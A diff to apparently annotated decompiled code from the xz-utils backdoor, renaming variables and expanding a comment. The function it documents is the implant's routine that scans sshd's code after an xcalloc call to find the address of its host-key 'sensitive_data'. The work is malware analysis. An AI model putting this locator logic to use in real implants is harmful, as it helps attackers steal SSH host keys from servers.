@@ -5,7 +5,11 @@
 
 
 /*
- * AutoDoc: Observes the xcalloc initialisation sequence that zeroes `sensitive_data` and records the data-section address that receives the result. This is the primary locator the implant uses to identify sshd's host-key container ahead of its scoring passes.
+ * AutoDoc: Locates the call site that matches the cached xcalloc reference, walks the following basic
+ * block looking for the MOV/LEA that parks the return value in .bss, and collects up to sixteen
+ * such stores. Whenever it sees three consecutive slots separated by 8 bytes (pointer,
+ * pointer+8, pointer+0x10) it treats the lowest address as the sensitive_data candidate
+ * generated during sshd's early zero-initialisation.
  */
 #include "xzre_types.h"
 
@@ -27,7 +31,14 @@ BOOL sshd_get_sensitive_data_address_via_xcalloc
   ulong uVar9;
   byte bVar10;
   undefined1 uVar11;
-  undefined1 local_100 [88];
+  dasm_ctx_t insn_ctx;
+  long store_hits [16];
+  u8 *xcalloc_call_target;
+  undefined1 local_100 [27];
+  u8 hit_count;
+  undefined4 local_e4;
+  byte local_e0;
+  u8 *local_d0;
   long local_a8 [16];
   
   *sensitive_data_out = (void *)0x0;
@@ -66,26 +77,26 @@ LAB_00103788:
   }
   else {
     if ((local_100._16_2_ & 0x40) != 0) {
-      uVar11 = local_100[0x1e];
+      uVar11 = local_e4._2_1_;
       if ((local_100._16_2_ & 0x20) != 0) {
-        bVar1 = local_100[0x1b] * '\x02';
+        bVar1 = hit_count * '\x02';
 LAB_00103782:
         uVar11 = uVar11 | bVar1 & 8;
       }
       goto LAB_00103788;
     }
     if ((local_100._16_2_ & 0x1000) != 0) {
-      uVar11 = local_100[0x20];
+      uVar11 = local_e0;
       if ((local_100._16_2_ & 0x20) != 0) {
-        bVar1 = local_100[0x1b] << 3;
+        bVar1 = hit_count << 3;
         goto LAB_00103782;
       }
       goto LAB_00103788;
     }
   }
-  if (((local_100._16_2_ & 0x100) != 0) &&
-     (puVar8 = (u8 *)local_100._48_8_, (local_100._28_4_ & 0xff00ff00) == 0x5000000)) {
-    puVar8 = (u8 *)(local_100._48_8_ + local_100._0_8_) + local_100._8_8_;
+  if (((local_100._16_2_ & 0x100) != 0) && (puVar8 = local_d0, (local_e4 & 0xff00ff00) == 0x5000000)
+     ) {
+    puVar8 = local_d0 + local_100._0_8_ + local_100._8_8_;
   }
   if ((data_start <= puVar8) && (puVar8 < data_end)) {
     uVar9 = (ulong)bVar10;
